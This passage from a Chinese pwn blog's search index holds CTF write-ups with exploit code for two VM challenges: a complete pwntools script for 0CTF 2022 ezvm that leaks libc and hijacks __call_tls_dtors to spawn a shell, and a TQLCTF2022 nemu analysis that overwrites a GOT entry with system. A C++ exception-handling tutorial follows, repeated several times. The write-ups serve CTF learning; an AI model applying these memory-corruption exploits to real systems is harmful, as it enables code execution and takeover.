:p8(15)+p64(add_ip) jnz = lambda add_ip :p8(16)+p64(add_ip) mov = lambda bss,imm :p8(0x14)+p8(bss)+p64(imm) #imm-\u003e寄存器 store = lambda bss,memory :p8(0x15)+p8(bss)+p64(memory) #寄存器-\u003ememory load = lambda bss,memory :p8(0x16)+p8(bss)+p64(memory) #mrmory-\u003e寄存器 exit_f = lambda :p8(0x17) 关键点在于这个malloc会把size左移3个bit，传入0x2000000000030000就能越界写 .text:0000000000002353 mov rax, [rbp+size_1] .text:0000000000002357 shl rax, 3 .text:000000000000235B mov [rbp+var_10], rax .text:000000000000235F mov rax, [rbp+var_10] .text:0000000000002363 mov rdi, rax ; size .text:0000000000002366 call _malloc 思路： free一个堆块进unsorted bin，memory 区域会留下libc 爆破出libc 利用__call_tls_dtors来getshell ","date":"2025-10-23","objectID":"/posts/vmpwn/:5:0","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#0ctftctf-2022-ezvm"},{"categories":["pwn"],"content":"\rexp不知道为什么最后bye bye的时候退不出去。。 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\",\"-p\",\"65\",\"-b\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(delim, data) sl = lambda data :p.sendline(data) sls = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(delim, data) r = lambda num :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) # lg = lambda s,addr : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s,addr)) lg = lambda s : log.info('\\033[1;31;40m %s --\u003e 0x%x \\033[0m' % (s, eval(s))) l64 = lambda :u64(p.recvuntil(\"\\x7f\")[-6:].ljust(8,b\"\\x00\")) l32 = lambda :u32(p.recvuntil(\"\\xf7\")[-4:].ljust(4,b\"\\x00\")) r64 = lambda :u64(p.recv(6).ljust(8,b'\\x00')) ir64 = lambda :int(p.recv(14),16) #----------------------------------------------------------------- gdbscript = \\ \"\"\" # bbase 0x23BF #call execute # bbase 0x2353 #malloc # bbase 0x228E #out malloc bbase 0x14e2 #free # bbase 0x1a0d #shr # bbase 0x1582 #switch # bbase 0x246F #exit c \"\"\" if len(sys.argv) \u003e 1 and sys.argv[1] == \"r\": p = remote(\"host.docker.internal\",9999 ) elif len(sys.argv) \u003e 1 and sys.argv[1] == \"d\": p = gdb.debug(address, gdbscript = gdbscript) else: p = process(address) def dbg(): gdb.attach(p) # gdb.attach(p, gdbscript=gdbscript) # pause() push = lambda bss :p8(0)+p8(bss) #压入寄存器的内容到栈 and_f = lambda :p8(9) nz = lambda add_ip :p8(15)+p64(add_ip) jnz = lambda add_ip :p8(16)+p64(add_ip) mov = lambda bss,imm :p8(0x14)+p8(bss)+p64(imm) #imm-\u003e寄存器 store = lambda bss,memory :p8(0x15)+p8(bss)+p64(memory) #寄存器-\u003ememory load = lambda bss,memory :p8(0x16)+p8(bss)+p64(memory) #mrmory-\u003e寄存器 exit_f = lambda :p8(0x17) #让memory为main_arena地址 sla(b'0ctf2022!!\\n',b'aaaa') opcode = exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x410\u003e\u003e3)) sla(b'input your code:\\n',opcode) # sla(b'continue?\\n',b'c') #爆破获取libc libc_base = 0x700000000000 for i in range(4,45,1): print('leaking bit '+str(i)) opcode = mov(0,1\u003c\u003ci) #bitmask存入r0 opcode+= push(0) #bitmask 压栈 opcode+= load(1,0) #main_arena地址存入r1 opcode+= push(1) #r1压栈 opcode+= and_f() #bit_mask 和 main_arena 与运算 opcode+= jnz(1) #该bit为0就exit opcode+= b'\\x18' + exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x410\u003e\u003e3)) sla(b'input your code:\\n',opcode) buffer = ru(b'finish!\\n',drop=True) if b'what' in buffer: libc_base |= 1\u003c\u003ci libc_base -= 0x219ce0 libc.address = libc_base lg(\"libc_base\") def rol(value): return (value \u003c\u003c 0x11) | (value \u003e\u003e (64 - 0x11)) \u0026 0xffffffffffffffff dest = rol(libc.sym['system']) #$fs_base + 0x30（randnumber） 置0 #0x181760 fs_base+0x30 opcode = store(0,0x302ec) # clear rand val opcode+= mov(0,libc_base - 0x2a00) #0x1816d8 $fs_base - 88 opcode+= store(0,0x302db) # rbp val opcode+= mov(0,dest) #0x1815f0 $fs_base - 0x140 opcode+= store(0,0x302be) # rbp val opcode+= mov(0,next(libc.search(b'/bin/sh'))) #0x1815f8 $fs_base - 0x138 opcode+= store(0,0x302bf) # rbp val opcode+= exit_f() sla(b'code size:\\n',str(len(opcode))) sla(b'memory count:\\n',str(0x2000000000030000)) sl(opcode) dbg() sla(b'continue?', b\"bye bye\\x00\") itr() # p/x $fs_base # opcode_ptr memory_ptr stack_ptr opcodesize mesize # sbase 0x5040 #stack sp #sbase 0x5090 # dq 0x181760 + memory_ptr ","date":"2025-10-23","objectID":"/posts/vmpwn/:5:1","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#exp-3"},{"categories":["pwn"],"content":"\rTQLCTF2022_nemu 别的师傅评价：一个完全无限制的越界读写问题。但是看似简单，读写操作的时候还需要经过一些检查。很值得一做。很适合作为VM pwn的入门题目仔细分析(正好也有源码，漏洞很经典) 这题主要考点：理解⼀个模拟器及调试器的整体架构，给了源码 交互： help:查看所有指令description si:单步执行1次 si 2:单步执行2次 c:一直执行 info r:查看寄存器 info w:查看断点 x 0x100005 :查看内容 x 4 0x100000：查看4个dword内容 w *0x100000：设置watch point d 1:删除第一个watch point set \u003c地址\u003e \u003c数据\u003e：修改数据 这里比较重要的就是guest_to_host这个宏 uint32_t vaddr_read(vaddr_t addr, int len) { return paddr_read(addr, len); } uint32_t paddr_read(paddr_t addr, int len) { return pmem_rw(addr, uint32_t) \u0026 (~0u \u003e\u003e ((4 - len) \u003c\u003c 3)); } #define pmem_rw(addr, type) *(type *)({\\ guest_to_host(addr); \\ }) /* convert the guest physical address in the guest program to host virtual address in NEMU */ #define guest_to_host(p) ((void *)(pmem + (unsigned)p)) 这个宏的p是真实的物理地址 pwndbg\u003e disass vaddr_read Dump of assembler code for function vaddr_read: 0x0000000000406ee0 \u003c+0\u003e: mov ecx,0x4 0x0000000000406ee5 \u003c+5\u003e: mov edi,edi 0x0000000000406ee7 \u003c+7\u003e: mov eax,0xffffffff 0x0000000000406eec \u003c+12\u003e: sub ecx,esi 0x0000000000406eee \u003c+14\u003e: shl ecx,0x3 0x0000000000406ef1 \u003c+17\u003e: shr eax,cl 0x0000000000406ef3 \u003c+19\u003e: and eax,DWORD PTR [rdi+0x6a3b80] 0x0000000000406ef9 \u003c+25\u003e: ret End of assembler dump. 查看汇编可以看到0x6a3b80就是p pwndbg\u003e dq 0x6a3b80+0x100000 0x7a3b80 \u003cpmem+1048576\u003e: 0x0027b900001234b8 0x0441c76601890010 0x7a3b90 \u003cpmem+1048592\u003e: 0x6600000002bb0001 0x01ffffe0009984c7 0x7a3ba0 \u003cpmem+1048608\u003e: 0x00d600000000b800 0x0000000000000000 0x7a3bb0 \u003cpmem+1048624\u003e: 0x0000000000000000 0x0000000000000000 100000: b8 34 12 00 00 movl $0x1234,%eax 这里也对应上了 而这里也没有对于边界的检查，所以可以进行越界读，set可以进行越界写 这里需要通过watchpoint去泄露 watchpoint数据结构 typedef struct watchpoint { int NO; struct watchpoint *next; /* TODO: Add more members if necessary */ char exp[30]; uint32_t old_val; uint32_t new_val; } WP; 考虑结构体内存对齐，实际上的内存结构： typedef struct watchpoint { int NO; // Offset: 0x0, Size: 0x4 bytes struct watchpoint *next; // Offset: 0x4, Size: 0x8 bytes /* TODO: Add more members if necessary */ char exp[30]; // Offset: 0x10, Size: 0x1e bytes uint32_t old_val; // Offset: 0x30, Size: 4 bytes uint32_t new_val; // Offset: 0x34, Size: 4 bytes } WP; //总共0x38 list_watchpoint: void list_watchpoint(){ WP *head2 = head; if(head == NULL) { printf(\"No watch pint to delete\\n\"); return; } printf(\"NO Expr Old Value New Value\\n\"); while(head2){ printf(\"%d %-18s %#x %#x\\n\",head2-\u003eNO,head2-\u003eexp,head2-\u003eold_val,head2-\u003enew_val); head2 = head2-\u003enext; } return; } pwndbg\u003e p \u0026head $7 = (WP **) 0x86a3fc8 \u003chead\u003e pwndbg\u003e x/8gx 0x60f018-0x20 0x60eff8: 0x0000000000000000 0x000000000060ee18 0x60f008: 0x00007d7a583572e0 0x00007d7a583332f0 0x60f018 \u003c__snprintf_chk@got.plt\u003e: 0x00007d7a58137d30 0x00007d7a580add30 0x60f028 \u003cputchar@got[plt]\u003e: 0x0000000000401506 0x0000000000401516 这里要让libc地址位于head+0x30处，就能通过old_val new_val泄露出libc地址 #pwndbg\u003e p/x 0x86a3fc8-0x6a3b80 #$1 = 0x8000448 sl(b'set 0x8000448 0x60eff0') # dbg() sl(b'info w') ru(b'New Value') ru(b'0x') libc_low = int(p.recv(8),16) ru(b'0x') libc_high = int(p.recv(4),16) lg(\"libc_high\") lg(\"libc_low\") libc_base = (libc_high\u003c\u003c32) | libc_low lg(\"libc_base\") 写入system： WP *new_wp(){ if(free_ == NULL){ assert(0); } //unlink WP *temp = free_; free_ = free_-\u003enext; //insert temp-\u003enext = NULL; return temp; } void set_watchpoint(char *args){ bool flag = true; uint32_t val = expr(args, \u0026flag); if (!flag) { printf(\"You input an invalid expression, failed to create watchpoint!\"); return ; } WP *wp = new_wp(); wp-\u003eold_val = val; memcpy(wp-\u003eexp, args, 30); //... } 这里可以看到： WP *wp = free_; memcpy(wp-\u003eexp, args, 30); 也就是w 0xdeedbeef的时候，会把0xdeedbeef写入free_+0x30处 这样我们只需要去set free_再w就能实现任意写 这里的思路是写strcmp的got为system，在ui_mainloop中,strcmp的第一个参数就是我们输入的命令，输入binsh就行 exp: 这里我用的本地的libc from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') address = './pwn' # address = './pwn_patched' elf = ELF(address) libc = elf.libc #----------------------------------------------------------------- s = lambda data :p.send(data) ss = lambda data :p.send(str(data)) sa = lambda de","date":"2025-10-23","objectID":"/posts/vmpwn/:6:0","series":null,"tags":null,"title":"VMpwn","uri":"/posts/vmpwn/#tqlctf2022_nemu"},{"categories":["pwn"],"content":"C++异常处理机制 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:0:0","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#"},{"categories":["pwn"],"content":"\r异常处理机制","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:0","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#异常处理机制"},{"categories":["pwn"],"content":"\r基础语法异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include \u003ciostream\u003e using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch try { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include \u003ciostream\u003e #include \u003cstdexcept\u003e using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAIIC++异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，现代 C++ 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#基础语法"},{"categories":["pwn"],"content":"\r基础语法异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch try { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAIIC++异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，现代 C++ 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#trycatch"},{"categories":["pwn"],"content":"\r基础语法异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch try { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAIIC++异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，现代 C++ 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#函数退出与栈展开"},{"categories":["pwn"],"content":"\r基础语法异常机制中主要的几个关键字：throw 抛出异常，try-catch响应异常 #include using namespace std; int main() { int x, y; cout \u003c\u003c \"请输入两个整数（x y）：\"; cin \u003e\u003e x \u003e\u003e y; try { if (y == 0) { // 抛出异常：除数不能为 0 throw runtime_error(\"除数不能为 0！\"); } cout \u003c\u003c \"结果: \" \u003c\u003c x / y \u003c\u003c endl; } catch (const runtime_error\u0026 e) { // 捕获并处理异常 cout \u003c\u003c \"发生异常：\" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"程序继续运行...\" \u003c\u003c endl; return 0; } 输入 10 2 ， 输出 结果: 5 输入10 0，会输出 发生异常：除数不能为 0！ 程序继续运行... try、catch try { program-statements } catch (exception-declaration) { handler-statements } catch (exception-declaration) { handler-statements } // .. . try块 用 try { ... } 包裹可能产生异常的代码。 在 try 内声明的变量，作用域仅限 try 内，catch 中不能访问。 catch块 当 try 内抛出异常时，运行时会寻找匹配的 catch。 一旦某个 catch 处理完，程序会继续执行 整个 try-catch 之后的语句 函数退出与栈展开在复杂的程序中，可能在一个try语句中嵌套另一个try语句 stack unwinding（栈展开）： 当一个异常被抛出，如果没有对应的catch能处理，就会终止这个函数，并返回给调用者 调用者继续查找自己的 try...catch 如果仍未找到 → 再返回上层调用者 … 一直往上追溯 如果最终没找到任何合适的 catch ，就会调用标准库函数 terminate()，程序直接退出 如果在某一层找到了匹配的catch，那么程序就会进入这个catch块执行，当 catch 执行完，程序会跳到该 try-catch 的最后一个 catch 之后继续执行。 #include #include using namespace std; void funcC() { cout \u003c\u003c \"进入 funcC\" \u003c\u003c endl; throw runtime_error(\"funcC 出现异常\"); // 抛出异常 cout \u003c\u003c \"funcC 正常结束\" \u003c\u003c endl; // 不会执行 } void funcB() { cout \u003c\u003c \"进入 funcB\" \u003c\u003c endl; funcC(); // 调用 funcC cout \u003c\u003c \"funcB 正常结束\" \u003c\u003c endl; // 不会执行 } void funcA() { cout \u003c\u003c \"进入 funcA\" \u003c\u003c endl; try { funcB(); // 调用 funcB } catch (const runtime_error\u0026 e) { cout \u003c\u003c \"捕获异常: \" \u003c\u003c e.what() \u003c\u003c endl; } cout \u003c\u003c \"funcA 继续执行\" \u003c\u003c endl; } int main() { funcA(); cout \u003c\u003c \"main 继续执行\" \u003c\u003c endl; return 0; } 输出结果： 进入 funcA 进入 funcB 进入 funcC 捕获异常: funcC 出现异常 funcA 继续执行 main 继续执行 RAIIC++异常会打断正常的程序执行流，此时，可能会有一些没有释放的内存、没有关闭的文件，可能会导致数据泄漏，因此，现代 C++ 编程强烈推荐使用 RAII（Resource Acquisition Is Initialization）： 把资源放到对象里（比如 std::vector 自动释放内存） 这样即使发生异常，栈展开时对象会自动调用析构函数，自动清理资源 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:1","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#raii"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 catch 来继续处理。 catch (std::exception\u0026 e) { std::cerr \u003c\u003c \"Log: \" \u003c\u003c e.what() \u003c\u003c \"\\n\"; throw; } The Catch-All Handler catch(...) 是一种特殊的 catch 块，用于捕获任何类型的异常 try { throw 42; } catch (...) { std::cout \u003c\u003c \"Caught something!\"; } try普通try块（ordinary try block） 只对 try { ... } 内部抛出的异常有效。 会按顺序匹配，第一个符合类型的 handler 会接管。 在 try 外面抛出的异常，跟这个 handler 没关系。 void f() { throw 1; // 不会被下面的 catch 捕获 try { throw 2; // 会被下面的 catch(...) 捕获 } catch (...) { // 处理 2 } throw 3; // 也不会被上面的捕获 } 函数try块（function try block） 和普通 try 不同，它不是语句，而是 整个函数体 被 try 包裹 它的作用范围比普通的广，它能捕获： 函数体里的异常 （如果是构造函数）初始化列表里的异常 struct X { int mem; // 构造函数初始化列表抛出异常 X() try : mem(f(true)) { // 构造函数体 } catch (...) { // 能捕获 f(true) 抛出的异常 } // 构造函数体里抛出的异常 X(int) try { throw 2; } catch (...) { // 捕获 2 } }; noexcept了解到一个函数不会抛出异常能帮助调用者简化程序，编译器更好的优化程序 void recoup(int) noexcept; // 不会抛异常 void alloc(int); // 可能抛异常 我们用noexcept来承诺一个函数不会抛出异常，这种承诺叫做nonthrowing specification（不抛异常说明） 需要注意： noexcept 必须出现在所有函数声明和定义里，或者都不出现 void f() noexcept; // 声明 void f() noexcept { } // 定义 如果函数声明为 noexcept，但运行时仍然抛出异常，程序会调用 std::terminate，直接结束 noexcept应该在以下两种情形中被使用： 我们确信该函数不会抛出异常 我们不知道如何处理异常 ","date":"2025-08-28","objectID":"/posts/cpp_pwn/:1:2","series":null,"tags":null,"title":"C++pwn","uri":"/posts/cpp_pwn/#高级异常机制"},{"categories":["pwn"],"content":"\r高级异常机制当一个异常被throw时，接下来的语句不会再执行，而是沿着调用链(call chain)跳到相应的catch中，这会导致： 在跳转过程中，调用栈上沿途的函数会被退出 退出时，局部对象会正常调用析构函数 对象销毁当 throw 发生时，函数会提前退出，局部对象（local objects）会自动销毁 类对象：编译器会自动调用它们的析构函数 构造函数中异常：类本身的析构函数不会执行，但已经成功构造的成员会被析构 数组 / 容器异常：已经构造的元素会被析构，未构造的不会 内置类型：不需要析构，退出时只是栈帧释放。 析构函数与异常栈展开时，程序已经在处理中一个异常，如果此时某个析构函数又抛出了新的异常，而且没有被它自己捕获，程序就会陷入“两个异常同时存在”的状态，这时C++ 就会调用 std::terminate()，程序立刻结束 如： struct Bad { ~Bad() { throw std::runtime_error(\"oops in destructor\"); // 危险！ } }; int main() { try { Bad b; throw std::runtime_error(\"main error\"); } catch (...) { std::cout \u003c\u003c \"Caught exception\\n\"; } } 所以，析构函数如果会抛出异常，需要用try-catch把他包起来，不能让异常传播出去 如 struct Good { ~Good() { try { // 某些可能抛异常的操作 throw std::runtime_error(\"oops in destructor\"); } catch (...) { // 在这里处理，不能让它继续抛 std::cerr \u003c\u003c \"Exception caught in destructor\\n\"; } } }; throw异常对象的构建 throw std::runtime_error(\"Something bad happened\"); 这个表达式会创建一个特殊的对象：称为异常对象，这个异常对象由编译器管理，存在于一个特殊的内存区域，而不是当前函数栈 传给catch的时候，是先复制一份，再传过去 不能抛出局部对象的指针 栈展开时，局部对象会被销毁 int* f() { int x = 42; throw \u0026x; // x 会在函数退出时销毁 } 等catch执行时，这个对象可能已经销毁，造成悬空指针 抛出异常时对类型的要求 被throw的表达式必须是完整类型（complete type），不能抛出一个只有声明而没有定义的类型，如： //只有声明而没有定义 class Incomplete; // 声明 void foo() { throw Incomplete(); } 类类型必须有可访问的析构函数 类类型必须有可访问的拷贝构造函数或移动构造函数 当抛出数组或函数时， 数组或函数类型会自动转成指针类型 catchcatch的参数就行函数参数 catch (类型 参数名) 的写法很像函数的参数声明 如果你不需要用到这个参数，可以省略名字： catch (std::runtime_error\u0026) { ... } catch参数类型规则 必须是 完整类型 允许左值引用 catch (MyEx\u0026)、禁止右值引用 catch (MyEx\u0026\u0026) 匹配规则 当一个异常被throw，程序会按顺序检查所有catch，第一个能匹配的catch会被选中，不会继续往后寻找 因此，更具体的异常类型必须放在更前面，如果有继承关系，子类的 catch 必须写在前面，基类的写在后面。 rethrow 有时候，一个 catch 只能做一部分处理，但真正的处理逻辑要交给更上层的函数 这时候，catch 里可以用 throw; 语句把当前异常重新抛出，交给上层的 